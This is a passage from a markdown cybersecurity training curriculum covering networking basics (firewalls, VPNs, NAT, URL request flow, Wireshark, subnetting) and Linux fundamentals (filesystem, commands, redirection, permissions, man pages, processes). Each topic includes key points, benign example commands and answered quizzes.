- Built-in features beyond filtering: intrusion detection/prevention (IDPS), web filtering, VPN support, anti-malware, and traffic logging for audits
- House-gate analogy from the module: a firewall is the security guard at your house's gate — friends and family (safe traffic) get in, strangers and thieves (malicious traffic) are turned away
- The module frames a firewall's core job around four threat categories: preventing hackers from infiltrating systems (unauthorized access), blocking malicious software before it reaches devices (malware/viruses), protecting sensitive information from being stolen (data breaches), and stopping overwhelming traffic designed to crash a network (denial-of-service)
- Worked example from the module: a firewall receives a request, flags it as coming from an untrusted source, and blocks it before it reaches the database — legitimate employee traffic passes through unaffected

```bash
iptables -L
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

**Resources:**

- [Cloudflare: What is a Firewall?](https://www.cloudflare.com/learning/security/what-is-a-firewall/) _(link)_
- [iptables(8) man page](https://man7.org/linux/man-pages/man8/iptables.8.html) _(link)_
- [Professor Messer Networking](https://www.professormesser.com) _(video)_

**Quick Quiz:**

1. Which firewall type tracks the state and context of a connection rather than just inspecting isolated packets?
   - **Stateful Inspection firewall** ✓
   - Simple packet-filtering firewall
   - Hub
   - Unmanaged switch
   > Stateful inspection firewalls track ongoing connection state and session context, unlike simple packet filters that check each packet in isolation.
2. What distinguishes an NGFW (Next-Generation Firewall) from a basic packet filter?
   - **It combines deep packet inspection, IPS, and application awareness, including inspecting HTTPS traffic** ✓
   - It only filters by IP and port like a basic packet filter
   - It cannot inspect encrypted traffic at all
   - It operates exclusively at Layer 1
   > NGFWs add deep packet inspection, intrusion prevention, and application-layer awareness on top of basic filtering, including HTTPS inspection.
3. Which command lists the current iptables rule set on a Linux firewall?
   - **iptables -L** ✓
   - arp -a
   - ss -tulpn
   - netstat -tulpn
   > iptables -L lists all currently configured rules across the default chains.

#### 20. VPN & Proxies `[theory]` — Week 2

A proxy and a VPN both mask your IP, but they work very differently. A proxy is a simple middleman — your request goes to the proxy first, so the destination site only ever sees the proxy's IP — and it typically doesn't encrypt anything. A VPN is a full encrypted tunnel for your entire connection: it encrypts everything you send, routes it through a secure server, and hides your traffic from your ISP, attackers on the same network, and the destination alike, at the cost of speed. The module spells out the mechanism for each: a proxy connects you to a proxy server, which forwards your request to the destination site and relays the reply back to you, so the site only ever talks to the proxy; a VPN connects you to a VPN server, encrypts your traffic before it ever leaves your device, carries it securely across the internet, has the VPN server forward the request to the destination, and returns the response through that same encrypted tunnel.

**Key Points:**

- Proxy types: HTTP (no encryption), HTTPS (adds encryption), SOCKS (any traffic type incl. streaming/gaming), Transparent (workplace filtering without user awareness), Reverse (protects/load-balances servers), Anonymous (hides IP but reveals proxy use), Elite (fully masks both)
- VPN types: Remote Access, Site-to-Site (links office locations), SSL/TLS (browser-based encrypted access), IPSec, MPLS (large enterprise), Cloud VPN
- Key trade-off: proxy has no encryption but is faster and works per-application; VPN has strong encryption and protects the whole connection, but is slower due to encryption overhead
- VPN protects public Wi-Fi connections from data theft — a proxy offers no such protection since it doesn't encrypt traffic
- TryHackMe and HackTheBox both require a VPN connection to reach their lab networks
- Watch for logging risk: free proxies and low-quality VPNs may log and sell user traffic despite marketing themselves as privacy tools
- How a proxy works, step by step per the module: you connect to a proxy server → the proxy forwards your request to the destination website → the website replies to the proxy, not to you → the proxy relays that response back to you
- How a VPN works, step by step per the module: you connect to a VPN server → the VPN encrypts your traffic → the encrypted data travels the internet securely → the VPN server forwards the request to the destination → the response returns through the same secure tunnel

**Resources:**

- [Cloudflare: What is a VPN?](https://www.cloudflare.com/learning/access-management/what-is-a-vpn/) _(link)_
- [TryHackMe VPN/access guide](https://tryhackme.com/access) _(link)_

**Quick Quiz:**

1. What is a key functional difference between a VPN and a typical proxy?
   - **A VPN encrypts all traffic through a tunnel, while a typical proxy is a simple, often unencrypted middleman** ✓
   - A proxy always encrypts traffic while a VPN never does
   - VPNs only work for HTTP traffic
   - Proxies always provide stronger security than VPNs
   > A VPN creates a fully encrypted tunnel for all traffic, whereas most proxy types simply relay traffic without encryption.
2. Why might using a VPN feel slower than a direct internet connection?
   - **The encryption overhead of tunnelling all traffic adds processing and latency** ✓
   - VPNs use no encryption so there is no overhead
   - VPNs only work over UDP, which is inherently slow
   - VPNs bypass the internet entirely
   > Encrypting and tunnelling all traffic adds processing overhead, which is the tradeoff for the privacy/security a VPN provides.
3. Why do platforms like TryHackMe and HackTheBox require a VPN connection?
   - **To let your machine reach the isolated lab network hosting the vulnerable machines** ✓
   - To permanently block you from completing any room
   - To speed up your general internet connection
   - To hide your public IP from the lab's scoring server only
   > The VPN tunnels your traffic into the platform's private lab network so you can reach the target machines directly.

#### 21. NAT (Network Address Translation) `[theory]` — Week 2

NAT translates private internal IP addresses into a single public IP for internet-bound traffic — the mechanism that lets your phone (192.168.1.2) and laptop (192.168.1.3) both reach the internet through your router's one public IP (203.0.113.1). Beyond conserving scarce IPv4 addresses, NAT is also a security boundary: an attacker probing 192.168.1.2 from outside only ever sees the router's public address, making it much harder to target a specific device inside the network directly.

**Key Points:**

- Static NAT: fixed one-to-one mapping (e.g. 192.168.1.2 always maps to 203.0.113.2) — used when a device needs a consistent external identity
- Dynamic NAT: a private IP is mapped to whichever address is free from a pool of public IPs — not always the same one
- PAT ('overloading'): many private IPs share one public IP simultaneously, distinguished only by port number — this is what a typical home router does for every device in the house
- Worked example: phone (192.168.1.2) and laptop (192.168.1.3) both reach the internet through the router's single public IP (203.0.113.1), tracked internally by port
- Security benefit: NAT hides internal addressing from outside probes — an attacker targeting 192.168.1.2 externally only ever sees the router's public IP
- Conserves IPv4 address space and hides internal network structure from the internet
- Complicates inbound connections — port forwarding is required to reach an internal service from outside

**Resources:**

- [Cloudflare: What is NAT?](https://www.cloudflare.com/learning/network-layer/what-is-nat/) _(link)_
- [Professor Messer Networking](https://www.professormesser.com) _(video)_

**Quick Quiz:**

1. What is the primary purpose of NAT?
   - **Translating private internal IP addresses to a shared public IP for internet-bound traffic** ✓
   - Encrypting all outbound traffic
   - Assigning MAC addresses to new devices
   - Blocking malicious traffic based on signatures
   > NAT translates many private internal IP addresses to one (or a few) public IPs so devices can share limited public address space.
2. What is a side effect of NAT that must be worked around for inbound connections to an internal service?
   - **Port forwarding is required to reach an internal service from outside the network** ✓
   - NAT makes all internal services directly reachable from the internet
   - NAT removes the need for a public IP entirely
   - NAT always blocks internal devices from reaching the internet
   > Because NAT hides internal IPs behind one public IP, an explicit port-forwarding rule is needed to route inbound connections to a specific internal host.
3. How does NAT help conserve IPv4 address space?
   - **It lets many internal devices share a single public IP address** ✓
   - It generates new public IP ranges on demand
   - It converts IPv4 addresses into IPv6 permanently
   - It eliminates the need for routers
   > By translating many private addresses to one shared public address, NAT reduces the number of public IPv4 addresses an organisation needs.

#### 22. What Happens When You Type a URL and Hit Enter (full flow) `[theory]` — Week 2

This classic interview question ties every networking concept in the module into one end-to-end flow: DNS resolution, the TCP handshake, the TLS handshake, and finally an actual HTTP request/response exchange. Tracing it end to end forces you to connect abstract layer names to the concrete bytes an attacker or defender actually sees on the wire.

**Key Points:**

- DNS resolution chain: browser cache → OS cache → ISP's local DNS resolver → (on a miss) recursive query to Root DNS servers → TLD servers (e.g. .com) → Authoritative DNS servers holding the real IP → result cached and returned, typically within milliseconds
- TCP 3-way handshake (SYN, SYN-ACK, ACK) opens a connection to the resolved IP before any HTTP data moves
- TLS handshake (HTTPS): Client Hello (ciphers + random number) → Server Hello (chosen cipher + certificate/public key) → browser verifies the cert via PKI, generates a session key, encrypts it with the server's public key → server decrypts it with its private key → all further traffic uses that shared session key
- Real request example from the module: `GET / HTTP/1.1` with Host, User-Agent, Accept, and Connection: keep-alive headers
- Real response example: `HTTP/1.1 200 OK` with Content-Type, Content-Length, and Connection headers, followed by the HTML body
- Browser parses the HTML into the DOM, fires separate requests for referenced CSS/JS/images, applies styling, and executes scripts
- Server may set cookies in the response to maintain login/session state; browser caches static assets for faster repeat visits

**Resources:**

- [What happens when you type a URL and press Enter](https://github.com/alex/what-happens-when) _(link)_
- [Cloudflare Learning Center](https://www.cloudflare.com/learning/) _(link)_

**Quick Quiz:**

1. What is the correct first step after typing a URL and hitting Enter?
   - **The browser checks its cache, then performs DNS resolution to find the server's IP** ✓
   - The browser immediately renders the page from a cached copy only
   - The browser sends the HTTP request before resolving DNS
   - The server immediately pushes HTML without any request
   > The browser first checks cache, then resolves the domain to an IP via DNS before any connection is made.
2. What establishes the initial connection to the server's IP on port 443 before encrypted data is sent?
   - **The TCP 3-way handshake (SYN, SYN-ACK, ACK)** ✓
   - The DNS TTL expiration
   - The browser's rendering engine
   - An ARP broadcast sent directly to the destination server
   > A TCP 3-way handshake establishes the connection to the server before any TLS negotiation or HTTP request occurs.
3. What happens right after the TCP handshake completes for an HTTPS site?
   - **A TLS handshake negotiates encryption before the HTTP request is sent** ✓
   - The HTTP request is sent in plaintext with no further negotiation
   - The browser immediately displays the final rendered page
   - The DNS resolver re-resolves the domain a second time
   > After the TCP handshake, a TLS handshake negotiates the encryption parameters before the browser sends the HTTP request over the encrypted channel.

#### 23. Wireshark Lab - Capture & Label Traffic by OSI Layer `[lab]` — Week 2

Hands-on packet capture and analysis lab — capture live traffic and identify protocols at each OSI layer using Wireshark's Statistics and Follow-Stream views. Use the exact patterns covered elsewhere in this module — the ARP broadcast/reply exchange, the TCP SYN/SYN-ACK/ACK handshake, and a raw HTTP GET request/response — to recognize real traffic instead of just filter syntax.

**Key Points:**

- Packets on a network are visible to anyone listening; HTTPS is encrypted, FTP/HTTP are not
- Statistics view shows source/destination IP and protocol breakdown — flag any unknown/suspicious IPs
- Right-click a packet → Follow → TCP Stream to view the full request/response conversation
- Look for the 3-way TCP handshake followed by an application-layer request (e.g. HTTP GET)
- An ARP capture should show the same broadcast-then-unicast-reply pattern covered in the MAC/ARP topic: a 'who has this IP?' broadcast followed by the owning device's unicast reply
- A captured HTTP exchange should match the request/response format from the URL-flow topic: a GET request with Host/User-Agent/Accept headers, and a 200 OK response with Content-Type/Content-Length headers
- A DNS query/response pair in the capture is the same resolution step covered in the URL-flow topic — the client asking to resolve a domain and the server returning an IP

**Resources:**

- [Wireshark](https://www.wireshark.org) _(tool)_
- [Wireshark User Guide](https://www.wireshark.org/docs/wsug_html_chunked/) _(link)_

**Quick Quiz:**

1. In Wireshark, which feature lets you view the full request/response conversation for one TCP connection?
   - **Right-click a packet -> Follow -> TCP Stream** ✓
   - Statistics -> Protocol Hierarchy view only
   - The Capture Options dialog
   - The Preferences menu
   > Follow -> TCP Stream reconstructs the full back-and-forth conversation of a single TCP connection into one readable view.
2. Why is HTTPS traffic harder to interpret directly in a Wireshark capture than plain HTTP?
   - **HTTPS traffic is encrypted, so the payload content is not visible in plaintext** ✓
   - HTTPS uses a completely different packet format Wireshark cannot capture
   - HTTPS never uses TCP so Wireshark cannot follow the stream
   - Wireshark blocks capturing HTTPS traffic by default
   > TLS encryption hides the HTTP payload from plaintext inspection, unlike unencrypted HTTP or FTP traffic.
3. What should you confirm first when verifying a connection was properly established before an HTTP GET?
   - **The 3-way TCP handshake (SYN, SYN-ACK, ACK) preceding the request** ✓
   - An ARP reply only
   - A DNS TXT record
   - The firewall's iptables rule list
   > A completed 3-way handshake confirms the TCP connection was properly established before any application-layer request was sent.

#### 24. Subnetting Practice Exercise (5 CIDRs) `[exercise]` — Week 2

Manual subnet-math practice, modeled on the same method the module teaches: calculate network address, broadcast address, and usable host range for 5 given CIDR blocks without a calculator first — think of it like sectioning a warehouse into labeled zones instead of one shared space.

**Key Points:**

- Worked reference example from the module: 192.168.1.0/24 split into four /26 subnets of 64 addresses each — 192.168.1.0/26 (hosts .1–.62), .64/26 (.65–.126), .128/26 (.129–.190), .192/26 (.193–.254)
- For any /n, host bits = 32 - n, total addresses = 2^(host bits)
- Network address = first address in the block; broadcast = last address in the block
- Usable hosts = total addresses - 2 (network + broadcast reserved)
- Practice going both directions: CIDR → range, and range → CIDR
- Warehouse analogy from the module: instead of one shared space for everything, you create labeled sections (subnets) so it's easier to find, manage, and restrict access to each one

**Resources:**

- [subnettingpractice.com](https://subnettingpractice.com) _(tool)_
- [Professor Messer: Subnetting](https://www.professormesser.com) _(video)_

**Quick Quiz:**

1. For a /26 subnet, how many host bits remain?
   - **6** ✓
   - 8
   - 24
   - 2
   > Host bits = 32 - prefix length, so for /26 that is 32 - 26 = 6 host bits.
2. How many total addresses does a /26 subnet contain?
   - **64** ✓
   - 32
   - 128
   - 256
   > Total addresses = 2^(host bits) = 2^6 = 64.
3. Why are the network and broadcast addresses excluded from the usable host count in a subnet?
   - **The network address identifies the subnet itself and the broadcast address is reserved for reaching all hosts on it** ✓
   - Both addresses are reserved for the ISP's exclusive use
   - They are reserved specifically for the default gateway
   - They are only excluded in IPv6, not IPv4
   > The first address identifies the subnet (network address) and the last is reserved for broadcasting to every host on it, so neither is assignable to a device.


---

## M3: OS Basics - Linux

**Month 1** · Week 3 · 15 topics

Linux is the operating system behind most servers, cloud infrastructure, and every major pentesting distro (Kali). This module builds real command-line fluency — navigation, permissions, processes, and networking — that every later lab assumes you already have.

**Learning Outcomes:**

- Navigate the Linux filesystem and manage files/directories confidently from the shell
- Read and modify permissions, including SUID/SGID/sticky-bit security implications
- Manage processes, services, users, and groups from the command line
- Use pipes, redirection, and core text tools (grep/sed/awk) to chain commands
- Capture traffic and manage firewall rules with tcpdump/iptables

**Module Resources:**

- [OverTheWire Bandit](https://overthewire.org/wargames/bandit/) _(platform)_
- [explainshell.com](https://explainshell.com) _(tool)_
- [TryHackMe Linux Fundamentals](https://tryhackme.com) _(platform)_

**Module Quiz (10 questions):**

1. Which combination makes up a Linux distro, and which distro is purpose-built for pentesting?
   - **Kernel + software + package manager; Kali Linux is the pentesting-focused distro** ✓
   - Only the kernel; Ubuntu is the pentesting distro
   - GUI only; Arch is the pentesting distro
   - Package manager only; Mint is the pentesting distro
   > A distro bundles kernel, software, and package manager, and Kali is specifically built with pentesting tools pre-installed.
2. Where do Linux logs typically live, and where are temporary files cleared on reboot?
   - **/var for logs, /tmp for temporary files** ✓
   - /etc for logs, /home for temporary files
   - /bin for logs, /opt for temporary files
   - /root for logs, /usr for temporary files
   > /var holds variable data like logs, while /tmp holds temporary files that are typically cleared on reboot.
3. Which octal value would you chmod a file to grant the owner full rwx and deny all access to group/others?
   - **700** ✓
   - 777
   - 644
   - 400
   > 700 breaks down as 7 (rwx) for the owner and 0 (---) for both group and others.
4. Why is a world-writable SUID binary owned by root considered dangerous?
   - **An attacker could modify or exploit it and inherit root privileges regardless of who invoked it** ✓
   - It disables all execute permissions for everyone
   - It only affects directories, never binaries
   - It automatically gets removed by the kernel at boot
   > SUID makes a binary run with its owner's (root's) privileges, so a writable or exploitable SUID root binary is a direct path to privilege escalation.
5. Which command finds all SUID binaries on a Linux filesystem for a privesc audit?
   - **find / -perm -4000 -type f 2>/dev/null** ✓
   - chmod -s /
   - ls -la /root
   - locate SUID
   > find / -perm -4000 -type f searches the whole filesystem for files with the SUID bit set.
6. What is the key difference between 'systemctl start' and 'systemctl enable' for a service?
   - **start runs it now only; enable makes it persist across reboots** ✓
   - They are functionally identical
   - enable runs it now only; start makes it persist forever
   - start disables the service permanently
   > start affects only the current session, whereas enable configures the service to also launch automatically on future boots.
7. Which tool captures live traffic for later Wireshark analysis, and which command shows listening ports?
   - **tcpdump for capture; ss -tulpn for listening ports** ✓
   - iptables for capture; crontab for listening ports
   - ps aux for capture; man for listening ports
   - apt for capture; chmod for listening ports
   > tcpdump -w saves captured packets to a .pcap file, and ss -tulpn (or netstat -tulpn) lists listening ports.
8. Where does Linux store actual password hashes, separate from general user metadata?
   - **/etc/shadow, readable only by root** ✓
   - /etc/passwd, world-readable
   - /etc/group
   - /home/<user>/.bash_history
   > Password hashes live in the root-only-readable /etc/shadow, while /etc/passwd only stores non-sensitive metadata.
9. Why is a world-writable script invoked by a root cron job a classic privilege-escalation vector?
   - **A low-privileged user can modify the script and have their code run as root the next time cron fires it** ✓
   - Cron jobs never actually execute as root
   - Crontab files cannot reference scripts, only built-in commands
   - World-writable files are automatically quarantined by cron
   > If cron runs a script as root and an unprivileged user can edit that script, their injected commands then run with root privileges.
10. What is the practical difference between find and locate when searching the filesystem?
   - **find searches live and reflects the current state; locate uses a prebuilt index that can be stale** ✓
   - find and locate are functionally identical in every way
   - locate always searches live; find uses a cached index
   - find can only locate directories
   > find walks the live filesystem in real time, while locate is faster but relies on a periodically-updated index that can be out of date.

### Topics

#### 25. Linux Overview - Distros, Philosophy, Use in Security `[theory]` — Week 3

Linux is a family of open-source operating systems built on the Linux kernel, created by Linus Torvalds and first released 17 September 1991 — built specifically because there was no free, working kernel available for the GNU project (a Unix-compatible OS made entirely of free software) at the time. A Linux 'distro' bundles the kernel with software and a package manager into a complete OS; every distro shares the same underlying kernel but differs in bundled tooling and philosophy. Linux is the default choice for servers and cloud infrastructure because of its performance, low resource usage, and greater customisability compared to Windows — it is also the kernel underneath Android and most IoT devices, is generally considered more secure than proprietary alternatives, and ships with a wide range of built-in tools for networking, system administration, and server management.

**Key Points:**

- A distro = kernel + software + package manager, e.g. Kali (pentesting, XFCE desktop, preinstalled offensive tools), Mint (lightweight, beginner-friendly, good on old hardware), Ubuntu (Debian-derived, servers, beginner-friendly), Arch (minimal, fully customisable down to the bootloader)
- Created because there was no free, working kernel available for the GNU project at the time
- Used across servers, cloud, IoT, and Android — considered more secure and customisable than Windows for these use cases
- Kali Linux ships pre-loaded with the pentesting tools used throughout this programme (Nmap, Burp, Metasploit, Hashcat)
- Delivers strong performance on both desktops and servers with comparatively low resource usage versus Windows
- Ships with a wide range of built-in tools for networking, system administration, and server management — part of why it's the default habitat for security and sysadmin work

```bash
tree / -L 1
```

**Resources:**

- [Kali Linux official documentation](https://www.kali.org/docs/) _(link)_
- [DistroWatch](https://distrowatch.com) _(link)_
- [TryHackMe Linux Fundamentals](https://tryhackme.com) _(platform)_

**Quick Quiz:**

1. What combination makes up a Linux 'distro'?
   - **Kernel + software + package manager** ✓
   - Just the kernel alone
   - Only a GUI desktop environment
   - A single vendor's proprietary binary
   > A distro bundles the Linux kernel with a set of software and a package manager, as described for examples like Kali, Mint, Ubuntu, and Arch.
2. Which distro is purpose-built for pentesting and ships tools like Nmap, Burp, and Metasploit pre-installed?
   - **Kali Linux** ✓
   - Linux Mint
   - Ubuntu Server
   - Arch Linux
   > Kali Linux ships pre-loaded with the pentesting tools used throughout this programme, unlike beginner or server-focused distros.
3. Who created the Linux kernel and when was it first released?
   - **Linus Torvalds, released 17 Sept 1991** ✓
   - Richard Stallman, released 1983
   - Dennis Ritchie, released 1969
   - Bill Gates, released 1995
   > The Linux kernel was created by Linus Torvalds and first released on 17 September 1991 to fill the gap of a free kernel for the GNU project.

#### 26. Linux File System Hierarchy (/bin, /etc, /var, /home, /tmp) `[theory]` — Week 3

Linux uses a single rooted tree (/) rather than separate drive letters like Windows — other drives are 'mounted' into this one tree, meaning a folder becomes the access point for that drive's contents. Running `tree / -L 1` on a real system shows the standard layout: /bin, /boot, /dev, /etc, /home, /lib (plus /lib32, /lib64, /libx32), /lost+found, /media, /mnt, /opt, /proc, /root, /run, /sbin, /srv, /sys, /tmp, /usr, and /var — each with a specific, well-defined purpose that Linux tooling and permission models assume you already know.

**Key Points:**

- /bin: system binaries (bash, ls, cat) — /etc: config files and system databases — /home: user home directories
- /var: variable/frequently-changing data (logs) — /tmp: temporary files, often cleared on reboot
- /root: root user's home — /usr: originally user home dirs, now non-critical binaries/libraries — /opt: locally-installed third-party software not from the package manager
- /dev: file representations of peripheral devices (USBs, SSDs, hard disks) — /media, /mnt: removable/temporary mount points
- /lost+found: special directory for recovered lost or corrupted files after a filesystem check
- /sbin: fundamental system binaries needed to start, maintain, and recover the system (often root-only)
- On many distros /bin, /lib, /lib32, /lib64, /libx32, and /sbin are just symlinks into /usr (e.g. /bin -> usr/bin)

```bash
tree / -L 1
ls -la /
```

**Resources:**

- [Linux Filesystem Hierarchy - hier(7) man page](https://man7.org/linux/man-pages/man7/hier.7.html) _(link)_
- [explainshell.com](https://explainshell.com) _(tool)_

**Quick Quiz:**

1. Which directory holds variable, frequently-changing data such as logs?
   - **/var** ✓
   - /etc
   - /bin
   - /home
   > /var stores variable data like logs, while /etc holds configuration and /bin holds system binaries.
2. Which directory is cleared on reboot and used for temporary files?
   - **/tmp** ✓
   - /usr
   - /opt
   - /root
   > /tmp is designated for temporary files and is typically cleared on reboot.
3. What is the key structural difference between Linux and Windows filesystems?
   - **Linux uses a single rooted tree with other drives mounted into it, rather than separate drive letters** ✓
   - Linux uses drive letters exactly like Windows
   - Windows has no concept of a root directory
   - Linux cannot mount additional storage devices
   > Linux organises everything under one root (/) tree, with additional drives mounted into that tree instead of assigned separate drive letters.

#### 27. File Navigation & Management (ls, cd, cp, mv, rm, find, locate, mkdir) `[theory]` — Week 3

The core commands you'll type hundreds of times a day, generally run in the format `name_of_binary [options/arguments]` — the shell prompt format is user@host:current_dir$, where ~ means your home directory and the trailing $ becomes # when you're logged in as root. Not every terminal displays your current location, which is what the pwd command is for: it prints the current working directory so you always know where you are. '.' denotes the directory you're currently in and '..' its parent; absolute paths always start from / and work from anywhere in the filesystem, while relative paths are resolved from wherever you currently happen to be.

**Key Points:**

- Shell commands generally follow the format `name_of_binary [options/arguments]`
- Prompt format is user@host:current_dir$ ('$' becomes '#' as root); ~ is shorthand for the current user's home directory
- pwd prints the current working directory — useful when the terminal prompt itself doesn't show your location
- '.' = current directory, '..' = parent directory; `cd ..` moves up one level, `cd .` does nothing
- Absolute paths start from / and work from anywhere; relative paths are resolved from your current directory only
- touch creates a new empty file (or just updates its timestamp if it already exists) and can create several files in one call: `touch file1 file2`
- `rm -r` deletes a directory and everything inside it recursively
- find searches the live filesystem by criteria (name, size, owner, permissions, time) and is more flexible than locate; locate uses a prebuilt index (faster, but can be stale); which finds the path of a binary

```bash
pwd
cd ~
cd /
cd ..
ls -la [dir]
touch file
mkdir dir
rm -r dir
mv src dest
cp src dest
find / -type f -name index.html
locate index.html
which nmap
```

**Resources:**

- [explainshell.com](https://explainshell.com) _(tool)_
- [find(1) man page](https://man7.org/linux/man-pages/man1/find.1.html) _(link)_
- [OverTheWire Bandit](https://overthewire.org/wargames/bandit/) _(platform)_

**Quick Quiz:**

1. What is the difference between find and locate?
   - **find searches the live filesystem by criteria; locate uses a prebuilt index that can be stale** ✓
   - find only searches file names, never the live filesystem; locate always searches live
   - Both commands are functionally identical
   - locate can only find directories, never files
   > find walks the actual filesystem in real time, while locate queries a prebuilt index that is faster but can be out of date.
2. In a filesystem path, what does '..' represent?
   - **The parent directory** ✓
   - The current directory
   - The user's home directory
   - The filesystem root
   > '.' refers to the current directory while '..' refers to its parent directory.
3. Which command recursively removes a directory and its contents?
   - **rm -r dir** ✓
   - rm dir
   - cp -r dir
   - mv dir
   > The -r (recursive) flag on rm is required to delete a directory along with everything inside it.

#### 28. Standard I/O, Pipes & Redirection (|, >, >>, tee, grep, sed, awk) `[theory]` — Week 3

Linux I/O uses three standard streams — 0/stdin, 1/stdout, 2/stderr. Redirection sends stream data to or from files (`>` overwrites stdout, `>>` appends stdout, `2>` redirects errors specifically, `2>>` appends errors to a file, and `<<` appends stdin to a file); pipes chain one program's stdout into the next program's stdin. `/dev/null` is a special file that silently discards anything written to it, which is why `2>/dev/null` is the standard way to suppress noisy permission-denied errors from a command like `ls /home /root` when you only care about the successful output.

**Key Points:**

- > overwrites stdout to a file, >> appends stdout, 2> redirects stderr only, < feeds stdin from a file
- << appends stdin to a file and 2>> appends stderr to a file, rounding out the full set of redirection operators
- /dev/null is a special discard file for suppressing unwanted output or errors, e.g. `ls /home /root 2>/dev/null`
- Pipes chain commands: command1 | command2 | command3 — e.g. `cat /proc/meminfo | grep MemFree`
- tee writes to the terminal AND a file simultaneously, e.g. `ping google.com | tee ping.log` lets you watch a live scan while also saving it
- cat (concatenate) can print one file, or join and print several files at once; echo simply prints its argument to stdout
- Without tee, redirecting a command straight into a file with > would hide the live output from the terminal entirely

```bash
echo "Hello World!" > hello.txt
echo "more text" >> hello.txt
ls /home /root 2>/dev/null
cat /proc/meminfo | grep MemFree
ping google.com | tee ping.log
```

**Resources:**

- [explainshell.com](https://explainshell.com) _(tool)_
- [Bash scripting cheat sheet (devhints.io)](https://devhints.io/bash) _(link)_
- [bash(1) man page](https://man7.org/linux/man-pages/man1/bash.1.html) _(link)_

**Quick Quiz:**

1. Which redirection operator appends output to a file instead of overwriting it?
   - **>>** ✓
   - >
   - <
   - 2>
   > >> appends stdout to the end of a file, whereas > overwrites the file's existing contents.
2. What is the purpose of piping (|) one command into another?
   - **To feed the first command's stdout as the second command's stdin** ✓
   - To run both commands completely independently in parallel
   - To redirect stderr only
   - To duplicate a file
   > A pipe chains commands together, sending the output of one directly into the input of the next.
3. What does tee do that plain redirection (>) does not?
   - **Writes output to the terminal AND a file simultaneously** ✓
   - Only writes to a file, discarding terminal output
   - Only works with stderr
   - Compresses the output automatically
   > tee duplicates its input, showing it on screen while also writing it to a file, useful for logging a live scan.

#### 29. File Permissions (chmod, chown, chgrp, SUID, SGID, Sticky Bit) `[theory]` — Week 3

Every file/directory has owner/group/other permission triads viewable via `ls -l` (e.g. `-rwxr-xr--`) — the first character shows file type (`-` file, `d` directory), followed by three characters each for owner, group, and other permissions. Misconfigured permissions, especially SUID binaries, are a classic Linux privilege-escalation vector: an SUID binary executes with the privileges of its owner (often root) regardless of who runs it.

**Key Points:**

- Octal notation: 4=read, 2=write, 1=execute (sum to combine), e.g. `chmod 700 file` (owner: all, group/others: none), `chmod 400 file` (owner: read-only, no one else can access it), `chmod 744 file` (owner: all, group/others: read only)
- Permission table: 0=--- 1=--x 2=-w- 3=-wx 4=r-- 5=r-x 6=rw- 7=rwx
- chown changes the owning user (typically root-only); chgrp changes the owning group; a user can belong to multiple groups at once (check with `id`)
- SUID (chmod u+s / 4xxx): binary runs as its owner regardless of who executes it
- SGID (chmod g+s / 2xxx): binary/directory runs as/inherits its owning group
- Sticky bit (chmod +t / 1xxx): restricts delete/rename to the file's owner or root — this is exactly why /tmp uses it, so one user can't delete another user's temp files
- `find / -perm -4000 -type f 2>/dev/null` lists every SUID-root binary on a box — the first move in manual Linux privilege-escalation enumeration

```bash
ls -l
chown user file
chgrp group file
chmod u+x file
chmod 700 file
chmod 400 file
find / -perm -4000 -type f 2>/dev/null
```

**Resources:**

- [GTFOBins](https://gtfobins.github.io) _(link)_
- [chmod(1) man page](https://man7.org/linux/man-pages/man1/chmod.1.html) _(link)_
- [HackTricks: Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) _(link)_

**Quick Quiz:**

1. What does chmod 700 grant?
   - **Read, write, execute for the owner only; nothing for group/others** ✓
   - Full access to everyone
   - Read-only access for everyone
   - Execute-only access for the owner
   > 700 in octal breaks down as 7 (rwx) for owner and 0 (---) for group and others.
2. What is a common security risk of an SUID binary?
   - **It runs with the privileges of its owner regardless of who executes it, potentially enabling privilege escalation** ✓
   - It always runs with the privileges of the invoking user only
   - It disables all executable permissions
   - It only applies to directories, never files
   > SUID makes a binary execute with its owner's privileges no matter who runs it, which is exactly why misconfigured SUID binaries are a classic privesc vector.
3. Which command finds all SUID binaries on a Linux system?
   - **find / -perm -4000 -type f 2>/dev/null** ✓
   - chmod +s /
   - ls -la /root
   - chown root /
   > find / -perm -4000 -type f searches the entire filesystem for files with the SUID bit set, suppressing permission-denied errors.

#### 30. Man Pages & Help System `[theory]` — Week 3

Built-in documentation for every command via `man` — indispensable when you hit an unfamiliar flag mid-engagement. Man pages are divided into numbered sections (1-9); the same word can mean different things depending on the section — `man 1 passwd` documents the passwd command, while `man 5 passwd` documents the /etc/passwd file format.

**Key Points:**

- Section numbers: 1=executable commands, 2=system calls (kernel functions), 3=library calls, 4=special files (usually /dev), 5=file formats/conventions (e.g. /etc/passwd), 6=games, 7=miscellaneous (macro packages/conventions, e.g. man(7), groff(7), man-pages(7)), 8=system administration commands (usually root-only), 9=kernel routines (non-standard)
- man 1 passwd = the passwd command; man 5 passwd = the /etc/passwd file format — same name, different section
- Inside man: press / then a search term and Enter, `n` for next match, `N` (capital) for previous match, `q` to quit
- man7.org (https://man7.org/linux/man-pages/index.html) hosts the same man pages online for whenever a terminal isn't available
- `man man` documents the man command itself

```bash
man man
man 5 passwd
man -k network
```

**Resources:**

- [man7.org](https://man7.org) _(link)_
- [explainshell.com](https://explainshell.com) _(tool)_

**Quick Quiz:**

1. Which man section documents file formats such as /etc/passwd?
   - **Section 5** ✓
   - Section 1
   - Section 8
   - Section 3
   > Man section 5 covers file formats, so 'man 5 passwd' explains the /etc/passwd file format specifically.
2. Inside the man pager, how do you search for a term?
   - **Type / followed by the term** ✓
   - Type Ctrl+F
   - Type grep term
   - Type find term
   > Inside man, typing / then a search term searches the page, with n/N to move between matches.
3. What does 'man 1 passwd' show compared to 'man 5 passwd'?
   - **man 1 shows the passwd command; man 5 shows the /etc/passwd file format** ✓
   - Both show identical information
   - man 1 shows file formats; man 5 shows commands
   - man 5 is only for kernel syscalls
   > Man sections disambiguate: section 1 covers commands while section 5 covers the corresponding file format.

#### 31. Process Management (ps, top, htop, kill, bg, fg, nohup) `[theory]` — Week 3

`ps` (process status) lists running processes with their PID (Process ID) — the number you need to inspect, background, or kill any running program. Because `ps` predates modern argument conventions, it supports two different syntaxes: 'Standard' (`-ef`: every process, full format with arguments) and 'BSD' (`aux`: all users, include non-terminal processes, user-readable format) — both are in everyday use and worth recognising.

**Key Points:**

- ps -aux (BSD syntax) vs ps -ef (Standard syntax) — both list all running processes, just with different flag conventions and column layouts
- Ctrl+C sends an interrupt (usually a clean exit); Ctrl+Z suspends a process into a Stopped state — fg resumes it in the foreground, bg resumes it in the background
